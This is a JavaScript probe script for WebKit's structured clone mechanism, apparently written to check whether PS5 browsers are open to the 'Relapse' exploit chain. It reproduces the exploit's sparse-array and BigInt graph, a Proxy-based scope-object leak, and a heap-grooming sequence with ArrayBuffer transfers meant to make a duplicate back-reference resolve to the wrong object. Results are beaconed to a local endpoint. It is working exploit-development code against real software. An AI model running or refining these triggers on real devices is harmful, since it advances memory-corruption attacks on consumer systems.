/* p108 — Structured Clone Object Pool Probe
 *
 * Tests the WebKit structured clone mechanism used by Relapse exploit.
 * The Relapse chain (PS5 7.00-13.60) uses history.replaceState to serialize
 * a graph with duplicate object references, then heap grooms between
 * serialize/deserialize so the back-reference resolves to the wrong object.
 *
 * This probe tests:
 * L1: API availability (history, MessageChannel, Symbol)
 * L2: Basic structured clone roundtrip via history.replaceState
 * L3: Duplicate reference integrity — does clone[2] === clone[1]?
 * L4: Large sparse array + BigInt filler (Relapse shape)
 * L5: leakScopeObject trick (Proxy-based super call)
 * L6: Symbol.prototype.toString on function with indexed props
 * L7: MessageChannel transfer behavior
 * L8: Full clone + heap groom attempt
 *
 * Beacon prefix: V108L-
 */
(function(){
var RUN_ID = "v108l" + Math.random().toString(36).slice(2,12);
var PREFIX = "V108L-";

function B(tag, body) {
  try {
    var d = typeof body === "object" ? JSON.stringify(body) : String(body);
    fetch("/beacon/" + PREFIX + tag, {
      method: "POST", body: JSON.stringify({r: RUN_ID, b: d.slice(0,1800)}),
      headers: {"Content-Type":"application/json"}
    }).catch(function(){});
  } catch(e){}
}
B("L", "press108-structclone");

/* ====== L1: API Availability ====== */
function test_L1() {
  var r = {};
  try {
    r.hasHistory = typeof history !== 'undefined';
    r.hasReplaceState = r.hasHistory && typeof history.replaceState === 'function';
    r.hasPushState = r.hasHistory && typeof history.pushState === 'function';
    r.hasState = r.hasHistory && 'state' in history;

    r.hasMessageChannel = typeof MessageChannel === 'function';
    r.hasSymbol = typeof Symbol === 'function';
    r.hasSymbolToString = typeof Symbol.prototype.toString === 'function';
    r.hasBigInt = typeof BigInt === 'function';

    r.hasPostMessage = typeof postMessage === 'function';
    r.hasStructuredClone = typeof structuredClone === 'function';

    if (r.hasMessageChannel) {
      try {
        var ch = new MessageChannel();
        r.port1Type = typeof ch.port1;
        r.port1HasPostMessage = typeof ch.port1.postMessage === 'function';
        r.port1HasClose = typeof ch.port1.close === 'function';
        ch.port1.close();
        ch.port2.close();
        r.channelWorks = true;
      } catch(e2) { r.channelErr = e2.name + ':' + e2.message.slice(0,60); }
    }

    r.SURVIVED = true;
    B("L1-APIS", r);
  } catch(e) { r.err = e.name + ":" + e.message.slice(0,80); B("L1-ERR", r); }
}

/* ====== L2: Basic Structured Clone via history.replaceState ====== */
function test_L2() {
  var r = {};
  try {
    if (typeof history === 'undefined' || typeof history.replaceState !== 'function') {
      r.SKIP = 'no_history';
      B("L2-SKIP", r);
      return;
    }

    var testObj = {a: 1, b: "hello", c: [1,2,3], d: {nested: true}};
    history.replaceState(testObj, "");
    r.storeOk = true;

    var clone = history.state;
    r.cloneType = typeof clone;
    r.cloneNotNull = clone !== null;

    if (clone !== null && typeof clone === 'object') {
      r.a = clone.a;
      r.b = clone.b;
      r.cLen = Array.isArray(clone.c) ? clone.c.length : -1;
      r.dNested = clone.d ? clone.d.nested : null;
      r.isNotSame = clone !== testObj;
      r.ROUNDTRIP = (clone.a === 1 && clone.b === "hello" && clone.d && clone.d.nested === true);
    }

    history.replaceState(null, "");
    r.SURVIVED = true;
    B("L2-BASIC", r);
  } catch(e) { r.err = e.name + ":" + e.message.slice(0,80); B("L2-ERR", r); }
}

/* ====== L3: Duplicate Reference Integrity ====== */
function test_L3() {
  var r = {};
  try {
    if (typeof history.replaceState !== 'function') {
      r.SKIP = 'no_history';
      B("L3-SKIP", r);
      return;
    }

    var shared = {marker: 0xDEAD};
    var graph = [shared, shared, shared];

    history.replaceState(graph, "");
    var clone = history.state;

    r.len = clone.length;
    r.ref01 = clone[0] === clone[1];
    r.ref02 = clone[0] === clone[2];
    r.ref12 = clone[1] === clone[2];
    r.allSame = r.ref01 && r.ref02;
    r.markerOk = clone[0] && clone[0].marker === 0xDEAD;
    r.notOriginal = clone[0] !== shared;

    var sparse = new Array(0x100);
    sparse[0] = shared;
    sparse[1] = shared;
    sparse[0xff] = -1;
    history.replaceState(sparse, "");
    var sc = history.state;
    r.sparseLen = sc.length;
    r.sparseRef = sc[0] === sc[1];
    r.sparseMarker = sc[0] && sc[0].marker === 0xDEAD;

    history.replaceState(null, "");
    r.SURVIVED = true;
    B("L3-DUPREF", r);
  } catch(e) { r.err = e.name + ":" + e.message.slice(0,80); B("L3-ERR", r); }
}

/* ====== L4: Relapse-shaped graph (large sparse + BigInt + duplicates) ====== */
function test_L4() {
  var r = {};
  try {
    if (typeof history.replaceState !== 'function') {
      r.SKIP = 'no_history';
      B("L4-SKIP", r);
      return;
    }

    var CONTROL_INDEX = 0xffff;
    var refTarget = {marker: 0x51515151};

    var fillerGraph = new Array(0xfffd);
    var pos = 0;
    var huge = 1n << 40n;
    fillerGraph[pos++] = huge;
    fillerGraph[pos++] = huge + 1n;
    while (pos < fillerGraph.length) fillerGraph[pos++] = {};

    var outerGraph = new Array(CONTROL_INDEX + 1);
    outerGraph[0] = fillerGraph;
    outerGraph[1] = refTarget;
    outerGraph[2] = refTarget;
    outerGraph[CONTROL_INDEX] = -64000;

    r.outerLen = outerGraph.length;
    r.fillerLen = fillerGraph.length;

    var t0 = Date.now();
    history.replaceState(outerGraph, "");
    r.serializeMs = Date.now() - t0;
    r.storeOk = true;

    var t1 = Date.now();
    var clone = history.state;
    r.deserializeMs = Date.now() - t1;

    if (clone === null) {
      r.cloneNull = true;
      B("L4-NULL", r);
      return;
    }

    r.cloneLen = clone.length;
    r.cloneType = typeof clone;

    r.ref1Type = typeof clone[1];
    r.ref2Type = typeof clone[2];
    r.refSame = clone[1] === clone[2];
    r.ref1Marker = clone[1] && clone[1].marker;
    r.ref2Marker = clone[2] && clone[2].marker;

    r.controlVal = clone[CONTROL_INDEX];
    r.filler0Type = clone[0] ? typeof clone[0][0] : 'missing';
    r.fillerType = Array.isArray(clone[0]) ? 'array' : typeof clone[0];
    if (Array.isArray(clone[0])) r.filler0Len = clone[0].length;

    r.DUPLICATE_INTACT = (clone[1] === clone[2]);

    history.replaceState(null, "");
    r.SURVIVED = true;
    B("L4-RELAPSE", r);
  } catch(e) { r.err = e.name + ":" + e.message.slice(0,80); B("L4-ERR", r); }
}

/* ====== L5: leakScopeObject via Proxy super call ====== */
function test_L5() {
  var r = {};
  try {
    function leakScopeObject() {
      class Leaker {
        leak() {
          return super.foo;
        }
      }
      Leaker.prototype.__proto__ = new Proxy({}, {
        get: function(target, property, receiver) {
          return receiver;
        }
      });
      var leak = Leaker.prototype.leak;
      return (function() {
        return leak();
      })();
    }

    var scope = leakScopeObject();
    r.scopeType = typeof scope;
    r.scopeNotNull = scope !== null && scope !== undefined;

    if (scope !== undefined && scope !== null) {
      r.scopeIsGlobal = scope === globalThis;
      r.scopeKeys = Object.keys(scope).slice(0, 5).join(',');

      try {
        scope['testProp'] = 42;
        r.writeable = scope.testProp === 42;
        delete scope.testProp;
      } catch(e2) { r.writeErr = e2.name; }

      try {
        for (var i = 0; i < 10; i++) scope['p' + i] = i;
        r.bulkWrite = true;
        for (var j = 0; j < 3; j++) scope[j] = 1.1 * j;
        r.indexWrite = true;
      } catch(e3) { r.bulkErr = e3.name; }

      try {
        Object.defineProperty(scope, 'getter', {
          get: function() { return 7; },
          configurable: true
        });
        r.getterWorks = scope.getter === 7;
      } catch(e4) { r.getterErr = e4.name; }
    }

    r.SURVIVED = true;
    B("L5-SCOPE", r);
  } catch(e) { r.err = e.name + ":" + e.message.slice(0,80); B("L5-ERR", r); }
}

/* ====== L6: Symbol.prototype.toString on function with indexed properties ====== */
function test_L6() {
  var r = {};
  try {
    var sym = Symbol('test');
    var symStr = Symbol.prototype.toString.call(sym);
    r.basicSymStr = symStr;
    r.basicLen = symStr.length;

    var fn = function testFn() { return 7; };
    fn[0] = {a: 1};
    fn[1] = {b: 2};
    for (var i = 2; i < 100; i++) fn[i] = 0;

    try {
      var wrappedSym = Object(sym);
      r.wrappedType = typeof wrappedSym;
      r.wrappedStr = Symbol.prototype.toString.call(wrappedSym);
    } catch(e2) { r.wrapErr = e2.name + ':' + e2.message.slice(0,40); }

    var bigFn = function bigFnTest() { return 42; };
    for (var k = 0; k < 1000; k++) bigFn[k] = 0;
    r.bigFnKeys = Object.keys(bigFn).length;

    try {
      var fnStr = bigFn.toString();
      r.fnStrLen = fnStr.length;
    } catch(e3) { r.fnStrErr = e3.name; }

    r.SURVIVED = true;
    B("L6-SYMBOL", r);
  } catch(e) { r.err = e.name + ":" + e.message.slice(0,80); B("L6-ERR", r); }
}

/* ====== L7: MessageChannel transfer behavior ====== */
function test_L7() {
  var r = {};
  try {
    if (typeof MessageChannel !== 'function') {
      r.SKIP = 'no_mc';
      B("L7-SKIP", r);
      return;
    }

    var ch = new MessageChannel();

    var buf1 = new ArrayBuffer(0x100);
    var view1 = new Uint8Array(buf1);
    view1[0] = 0x42;
    r.beforeLen = buf1.byteLength;

    try {
      ch.port1.postMessage(0, [buf1]);
      r.transferOk = true;
      r.afterLen = buf1.byteLength;
      r.detached = buf1.byteLength === 0;
    } catch(e2) { r.transferErr = e2.name + ':' + e2.message.slice(0,60); }

    try {
      var buf2 = new ArrayBuffer(0x10000);
      var buf3 = new ArrayBuffer(0x10000);
      ch.port1.postMessage(0, [buf2, buf3]);
      r.multiTransfer = true;
      r.buf2Detached = buf2.byteLength === 0;
      r.buf3Detached = buf3.byteLength === 0;
    } catch(e3) { r.multiErr = e3.name + ':' + e3.message.slice(0,60); }

    try {
      var bigBuf = new ArrayBuffer(0x400000);
      ch.port1.postMessage(0, [bigBuf]);
      r.bigTransfer = true;
      r.bigDetached = bigBuf.byteLength === 0;
    } catch(e4) { r.bigErr = e4.name + ':' + e4.message.slice(0,60); }

    ch.port1.close();
    ch.port2.close();

    r.SURVIVED = true;
    B("L7-TRANSFER", r);
  } catch(e) { r.err = e.name + ":" + e.message.slice(0,80); B("L7-ERR", r); }
}

/* ====== L8: Clone + groom — probing for object pool mismatch ====== */
function test_L8() {
  var r = {};
  try {
    if (typeof history.replaceState !== 'function' || typeof MessageChannel !== 'function') {
      r.SKIP = 'missing_apis';
      B("L8-SKIP", r);
      return;
    }

    var CONTROL_INDEX = 0xffff;
    var DUPLICATE_INDEX = 2;
    var MEMORY_WINDOW_SIZE = 0x100;

    var memoryBuffer = new ArrayBuffer(MEMORY_WINDOW_SIZE);
    var memoryView = new Uint8Array(memoryBuffer);
    memoryView[0] = 0x3c;
    memoryView[0x20] = 0x5a; memoryView[0x21] = 0xa5;
    memoryView[0x22] = 0xc3; memoryView[0x23] = 0x3c;
    memoryView[0x24] = 0xde; memoryView[0x25] = 0xad;
    memoryView[0x26] = 0xbe; memoryView[0x27] = 0xef;

    var refTarget = {marker: 0x51515151};

    var fillerGraph = new Array(0xfffd);
    var pos = 0;
    var huge = 1n << 40n;
    fillerGraph[pos++] = huge;
    fillerGraph[pos++] = huge + 1n;
    while (pos < fillerGraph.length) fillerGraph[pos++] = {};

    var outerGraph = new Array(CONTROL_INDEX + 1);
    outerGraph[0] = fillerGraph;
    outerGraph[1] = refTarget;
    outerGraph[DUPLICATE_INDEX] = refTarget;
    outerGraph[CONTROL_INDEX] = -64000;

    history.replaceState(outerGraph, "");
    r.storeOk = true;
    outerGraph = null;
    fillerGraph = null;

    var ch = new MessageChannel();
    ch.port1.close();
    ch.port2.close();

    var keepAlive = [];
    for (var i = 0; i < 128; i++) {
      keepAlive.push(new ArrayBuffer(0x10000));
    }
    r.heapPadded = true;

    var hole1 = new ArrayBuffer(0x81000);
    var hole2 = new ArrayBuffer(0x81000);
    var separator = new ArrayBuffer(0x10000);
    var predecessor = new ArrayBuffer(0x80000);
    var finalHole = new ArrayBuffer(0x80000);

    keepAlive.push(separator);
    keepAlive.push(predecessor);

    try {
      ch.port1.postMessage(0, [hole1, hole2, finalHole]);
      r.holesCreated = true;
      r.hole1Det = hole1.byteLength === 0;
      r.hole2Det = hole2.byteLength === 0;
    } catch(e2) {
      r.holeErr = e2.name + ':' + e2.message.slice(0,60);
    }

    var clone = history.state;
    if (clone === null) {
      r.cloneNull = true;
      B("L8-NULL", r);
      history.replaceState(null, "");
      return;
    }

    r.cloneLen = clone.length;

    var dup = clone[DUPLICATE_INDEX];
    var ref1 = clone[1];

    r.ref1Type = typeof ref1;
    r.dupType = typeof dup;
    r.refSame = ref1 === dup;

    if (ref1 !== dup) {
      r.MISMATCH = true;

      if (dup && typeof dup === 'object') {
        try {
          r.dupConstructor = dup.constructor ? dup.constructor.name : 'none';
          if (dup instanceof Uint8Array) {
            r.IS_UINT8 = true;
            r.dupLen = dup.length;
            r.dupFirst4 = Array.from(dup.slice(0,4)).map(function(v){return v.toString(16)}).join(',');
          } else {
            r.dupKeys = Object.keys(dup).slice(0,5).join(',');
          }
        } catch(e3) { r.inspectErr = e3.name; }
      }
    } else {
      r.INTACT = true;
      r.markerOk = ref1 && ref1.marker === 0x51515151;
    }

    clone[DUPLICATE_INDEX] = undefined;
    clone = null;
    history.replaceState(null, "");

    r.SURVIVED = true;
    B("L8-GROOM", r);
  } catch(e) { r.err = e.name + ":" + e.message.slice(0,80); B("L8-ERR", r); }
}

/* ====== Run ====== */
try {
  test_L1();
  setTimeout(test_L2, 1000);
  setTimeout(test_L3, 3000);
  setTimeout(test_L4, 6000);
  setTimeout(test_L5, 10000);
  setTimeout(test_L6, 14000);
  setTimeout(test_L7, 18000);
  setTimeout(test_L8, 25000);
} catch(e) { B("FATAL", String(e).slice(0,200)); }

var hbI = setInterval(function(){ B("HB","hb"); }, 5000);
setTimeout(function(){ clearInterval(hbI); B("Z2","probe108-done"); }, 60000);
})();
